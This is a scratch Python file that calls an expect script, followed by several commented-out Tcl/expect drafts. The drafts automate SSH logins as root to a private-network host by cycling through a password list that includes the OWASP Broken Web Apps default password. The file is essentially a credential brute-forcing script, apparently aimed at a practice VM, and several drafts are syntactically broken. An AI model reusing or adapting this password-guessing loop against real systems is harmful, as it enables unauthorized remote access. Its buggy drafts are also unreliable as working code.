import os
import pexpect
x = os.system('./ssh/SSH.exp')



'''
expect -exact "\rroot@192.168.1.136's password: "
send -- "asd\r"
expect -exact "\rroot@192.168.1.136's password: "
send -- "owaspbwa\r"
send -- "exit \r"


#!/usr/bin/expect -f
#!/bin/bash

set timeout -1
spawn ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.1.136 -y


expect {
    "assword:" {
        send -- "test\r";
        expect "You have new mail."
        send -- "exit\r"
        expect "Connection to 192.168.1.136 closed."
        spawn python3 found.py
        exp_continue
    }
    "assword:" {
        send -- "owaspbwa\r";
        expect "You have new mail."
        send -- "exit\r"
        expect "Connection to 192.168.1.136 closed."
        spawn python3 found.py
    }
}
expect eof



''''''
#!/usr/bin/expect -f
#!/bin/bash

exp_internal 1
set timeout -1
set passwords [list foo bar owaspbwa]
set connected false
set passwordUsed "test"
spawn ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.1.136 -y

foreach pw $passwords {
    expect {
        "assword:" {
            set passwordUsed "$pw"
            send -- "$pw\r"
            exp_continue
            
        }
    }
}
expect eof



'''
'''

foreach i $passwords {
    expect "assword:" { send -- "$i\r";}
    expect "asd" {send "test"}
}
expect eof
'''
'''
foreach i $passwords {
    
    expect {
        "assword:" {
            if {$idx == [llength $passwords]{error "No Passwords accepted"}}
            send -- "$i\r"
            incr idx
            exp_continue
        }
        "asd"{
            send "test"
        }
    }
}  
expect eof
'''


'''
foreach i $passwords {
    expect "assword:" { 
        if {$idx == [llength $passwords]}{
            send_user "No password succeded"
            exit
        }

    }
    expect "You have new mail." {
        send -- "exit\r"
        set passwordUsed $i
        set connected true
        send_user $passwordUsed
    }
}

'''